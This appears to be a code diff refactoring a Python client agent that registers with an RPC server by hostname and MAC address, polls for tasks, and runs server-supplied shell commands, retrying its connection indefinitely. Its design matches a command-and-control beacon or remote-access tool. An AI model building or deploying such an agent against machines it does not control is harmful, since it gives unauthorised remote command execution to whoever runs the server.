@@ -6,15 +6,18 @@ import socket
 import subprocess
 
 SERVER = "http://127.0.0.1:8000/rpc"
+MAX_BACKOFF = 15
 
 class Agent:
     def __init__(self):
         self.client_id = None
         self.session = requests.Session()
+        self.hostname = socket.gethostname()
+        self.mac = self.get_mac()
 
         self.handlers = {
             "shell": self.handle_shell,
-            "print_message": self.handle_print
+            "health": self.handle_health
         }
 
     def rpc(self, method, **params):
@@ -42,14 +45,9 @@ class Agent:
                 raise Exception(err["message"] if isinstance(err, dict) else err)
                 
             return data.get("result")
-            
-        except Exception as e:
-            print("[RPC ERROR]", e)
-            return None
 
-    @staticmethod
-    def get_hostname():
-        return socket.gethostname()
+        except (requests.RequestException, ValueError):
+            raise
 
     @staticmethod
     def get_mac():
@@ -58,7 +56,15 @@ class Agent:
             f"{(mac >> shift) & 0xff:02x}"
             for shift in range(40, -1, -8)
         )
-    
+
+    @staticmethod
+    def result(stdout="", stderr="", exit_code=0):
+        return {
+            "stdout": stdout,
+            "stderr": stderr,
+            "exit_code": exit_code
+        }
+
     def handle_shell(self, params):
         cmd = params.get("cmd")
 
@@ -69,7 +75,8 @@ class Agent:
             cmd,
             shell = True,
             capture_output = True,
-            text = True
+            text = True,
+            timeout = 300
         )
 
         return self.result(
@@ -78,22 +85,21 @@ class Agent:
             exit_code = result.returncode
         )
 
-    def handle_print(self, params):
-        return self.result(stdout = params.get("message", ""))
-    
-    @staticmethod
-    def result(stdout="", stderr="", exit_code=0):
-        return {
-            "stdout": stdout,
-            "stderr": stderr,
-            "exit_code": exit_code
-        }
+    def handle_health(self, params):
+        return self.result(
+            stdout = json.dumps({
+                "status": "ok",
+                "hostname": self.hostname,
+                "client_id": self.client_id
+            }),
+            exit_code = 0
+        )
 
     def identify(self):
         result = self.rpc(
             "identify", 
-            hostname = self.get_hostname(),
-            mac = self.get_mac()
+            hostname = self.hostname,
+            mac = self.mac
         )
 
         if result:
@@ -140,26 +146,21 @@ class Agent:
             return
         
         try:
-            result = handler(params)
+            output = handler(params)
+            status = "ok"
 
-            self.send_result(task_id, "ok", result)
-        
         except Exception as e:
-            self.send_result(
-                task_id,
-                "error",
-                self.result(
-                    stderr = str(e),
-                    exit_code = -1
-                )
+            output = self.result(
+                stderr = str(e), 
+                exit_code = -1
             )
+            status = "error"
+
+        self.send_result(task_id, status, output)
 
     def run(self):
-        print("[*] loading profile...")
-
-        if not self.identify():
-            print("[-] failed to identify")
-            return
+        while not self.identify():
+            time.sleep(5)
         
         print(f"[+] identified as {self.client_id}")
 
@@ -175,14 +176,9 @@ class Agent:
                 backoff = 1
                 time.sleep(5)
 
-            except requests.RequestException:
-                delay = random.uniform(
-                    backoff * 0.5,
-                    backoff
-                )
-
-                time.sleep(delay)
-                backoff = min(backoff * 2, max_backoff)
+            except (requests.RequestException, ValueError):
+                time.sleep(backoff)
+                backoff = min(backoff + 1, MAX_BACKOFF)
 
 if __name__ == "__main__":
     Agent().run()
